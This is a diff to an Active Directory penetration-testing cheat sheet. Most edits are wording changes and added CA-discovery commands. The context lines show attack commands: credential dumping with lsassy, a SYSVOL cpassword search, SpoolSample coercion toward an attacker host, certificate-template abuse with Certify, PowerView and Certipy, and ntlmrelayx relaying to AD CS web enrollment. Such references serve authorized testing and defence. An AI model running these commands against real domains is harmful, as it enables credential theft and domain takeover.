@@ -221,7 +221,7 @@
    * `crackmapexec smb <ip_subnet> -u <user> -p <pass> -M lsassy`
 
 
-##  
+## GPPPassword
 * CLI
   * `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`
 * Impacket
@@ -753,8 +753,14 @@ $assem = [System.Reflection.Assembly]::Load($data)
 * `SpoolSample.exe <dc> <attacker>`
 
 
-## ADCS
+## AD CS
 
+* Check for CA:
+  * Linux
+    * `rpc net group members "Cert Publishers" -U "<domain>"/"<user>"%"<password>" -S "<dc>"`
+  * Windows
+    * `certutil -config - -ping`
+    * `net group "Cert Publishers" /domain`
 * https://github.com/GhostPack/Certify
 * ESC1 - Misconfigured Certificate Templates
    * When a certificate template allows to specify a "subjectAltName", it is possible to request a certificate for another user. It can be used for privilege escalation if the EKU specifies "Client Authentication" or "ANY". If the EKU specifies "Server Authentication", you're out of luck.
@@ -773,7 +779,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * Modify the EKU from ServerAuthentication to ClientAuthentication using PowerView:
      * `Set-DomainObject -SearchBase "LDAP://dc.domain.tld/CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=tld" -Identity WebServer -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose`
 * ESC5 - Vulnerable PKI AD Object Access Control
-   * This is a container for AD misconfigurations that happen outside of ADCS. For example, when you can take over the CA server computer object by means of an RBCD. Basically it involves compromising the CA server itself.
+   * This is a container for AD misconfigurations that happen outside of AD CS. For example, when you can take over the CA server computer object by means of an RBCD. Basically it involves compromising the CA server itself.
    * No examples here.
 * ESC6 - `EDITF_ATTRIBUTESUBJECTALTNAME2`
    * If the CA is configured with the "EDITF_ATTRIBUTESUBJECTALTNAME2" flag, and the User template is enabled (Certify.exe will mention this), any user can escalate to domain admin. The idea is the same where you specify a subjectAltName.
@@ -784,7 +790,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
       * `Certify.exe setconfig /enablesan /restart`
       * `Certify.exe request /ca:<server\ca-name> /template:<template> /altname:<domain>\<da>`
 * ESC8: ESC8 - NTLM Relay to AD CS HTTP Endpoints
-   * If HTTP-based certificate enrollment interfaces are enabled, they are most likely vulnerable to NTLM relay attacks. The domain controller's NTLM credentials can then be relayed to the ADCS web enrollment and a DC certificate can be enrolled. This certificate can then be used to request a TGT and perform a DCSync.
+   * If HTTP-based certificate enrollment interfaces are enabled, they are most likely vulnerable to NTLM relay attacks. The domain controller's NTLM credentials can then be relayed to the AD CS web enrollment and a DC certificate can be enrolled. This certificate can then be used to request a TGT and perform a DCSync.
 * Example:
    * `ntlmrelayx -t "http://<ca-server>/certsrv/certfnsh.asp" --adcs --template <template>`
    * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
@@ -806,6 +812,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * Verify
       * `ls \\dc1.bamisoup.com\c$`
 * Certipy - ESC1
+  * https://github.com/ly4k/Certipy
   * Check vulnerable for certificate templates
     * `certipy find -u <user> -p <pass> -dc-ip <ip> -vulnerable`
   * Request certificate with alternative name
